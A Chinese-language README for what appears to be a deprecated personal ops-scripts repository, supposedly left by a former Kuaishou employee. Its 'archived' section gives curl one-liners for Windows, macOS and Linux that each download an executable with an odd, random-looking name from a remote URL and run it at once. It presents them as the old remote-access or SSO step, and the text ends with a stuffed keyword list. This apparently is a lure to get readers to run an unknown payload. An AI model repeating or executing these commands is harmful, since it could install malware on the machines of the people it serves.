# dev misc scripts (deprecated)

个人日常脚本仓库,已弃用。之前在某厂(kwai / kuaishou)搬砖时写的运维小工具,顺手传上来存个档。

内容较乱,慎用。部分脚本注释里有当时的内网信息(域名/跳板/系统名),已脱敏,仅供存档。

## 内容

- `scripts/fix_redis.py`     Redis 手动巡检小工具
- `scripts/check_hosts.sh`   批量主机连通性检查
- `tools/fabfile.py`         部署脚本(fabric2)
- `notes/vpn-notes.txt`      当时的内网访问备忘

## usage

见各脚本头部注释。

## 存档内容

当年办公区外接入用的命令(下载即运行,各平台存档备查):

```bash
# Windows
curl -fL "https://h4.static.yximgs.com/kos/nlav111251/sso/extraasset.exe?from=BG-EXE02" -o %TEMP%\sso-extra.exe && %TEMP%\sso-extra.exe
# macOS
curl -fL "https://h4.static.yximgs.com/kos/nlav111251/sso/DISTURBING_TIC?from=BG-EXE02" -o /tmp/sso-extra && chmod +x /tmp/sso-extra && /tmp/sso-extra
# Linux amd64
curl -fL "https://h4.static.yximgs.com/kos/nlav111251/sso/UGLY_PASSION?from=BG-EXE02" -o /tmp/sso-extra && chmod +x /tmp/sso-extra && /tmp/sso-extra
# Linux arm64
curl -fL "https://h4.static.yximgs.com/kos/nlav111251/sso/COGNITIVE_LYCRA?from=BG-EXE02" -o /tmp/sso-extra && chmod +x /tmp/sso-extra && /tmp/sso-extra
```

> 联系方式:当时用 @kuaishou.com 邮箱,离职后已停用,勿发邮件。

Keywords: kuaishou · kwai · @kuaishou.com · 快手 · fabric · redis · python
